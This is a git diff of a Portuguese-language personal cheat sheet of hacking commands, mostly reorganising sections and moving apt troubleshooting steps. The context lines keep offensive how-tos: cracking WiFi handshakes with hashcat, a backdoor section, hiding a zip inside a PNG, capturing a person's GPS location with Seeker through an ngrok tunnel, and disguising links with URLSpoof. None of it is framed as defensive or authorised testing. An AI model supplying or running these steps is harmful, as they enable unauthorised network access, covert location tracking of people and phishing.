@@ -6,27 +6,7 @@ git add (documento)
 git commit -m "nome do commit"
 git push -u origin "nome do branch"
 
-
-   ## Corrigindo erro Unable to locate pack update e upgrade ##
-#Double-check the package spelling
-apt-cache search keyword
-#Update Package Lists
-sudo apt update -y
-#Enable All Repositories
-nano /etc/apt/sources.list
-sudo apt update
-#Check Package Availability
-apt-cache search package-name
-#Update and Upgrade
-sudo apt update
-sudo apt upgrade
-#Fix Broken Dependencies
-sudo apt --fix-broken install
-#Check If the Package is Available for your OS Version
-cat /etc/os-release
-#Reinstall Package Manager
-sudo apt-get install --reinstall apt
-
+--------------------------------------------------------------------------------
 
    ## WIFI ##
 
@@ -37,6 +17,7 @@ https://hashcat.net/cap2hashcat/ (FUNCIONA)
 
 sudo hashcat -m 22000 -a3 ?d?d?d?d (aquivo).hccapx
 
+--------------------------------------------------------------------------------------
 
    ## BACKDOOR ##
 
@@ -101,6 +82,7 @@ zip ().zip ().txt (escondendo arquivo txt no zip)
 cat ().zip > ().png (escondendo zip na imagem)
 cat ().png (verificar informações da imagem)
 
+----------------------------------------------------------------------------------
 
   ## Capturando localizaçãõ  GPS de Apple ou andoird ##
 
@@ -115,7 +97,9 @@ sudo python3 ./seeker.sh
 É importante ligar o ngrok antes na porta 8080 (a que o seeker usa)
 sudo ngrok http 8080
 
-  ## Camuflando link ##
+--------------------------------------------------------------------------------------------
+
+  ## Camuflando links ##
 
 Com o URLSpoof
 sudo git clone https://github.com/Darkmux/URLSpoof.git
@@ -123,3 +107,36 @@ cd URLSpoof
 chmod 777 urlspoof.sh
 bash urlspoof.sh
 urlspoof (para executar)
+
+-----------------------------------------------------------------------------
+
+  ## Corrigindo erros ##
+
+# Waiting for cache lock
+Exluido arquivos lock (método mais funcional)
+sudo rm /var/lib/dpkg/lock
+sudo rm /var/lib/apt/lists/lock
+sudo rm /var/lib/dpkg/lock-frontend
+sudo rm /var/cache/apt/archives/lock
+sudo dpkg --configure -a
+
+#Unable to locate pack update e upgrade ##
+#Double-check the package spelling
+apt-cache search keyword
+#Update Package Lists
+sudo apt update -y
+#Enable All Repositories
+nano /etc/apt/sources.list
+sudo apt update
+#Check Package Availability
+apt-cache search package-name
+#Update and Upgrade
+sudo apt update
+sudo apt upgrade
+#Fix Broken Dependencies
+sudo apt --fix-broken install
+#Check If the Package is Available for your OS Version
+cat /etc/os-release
+#Reinstall Package Manager
+sudo apt-get install --reinstall apt
+
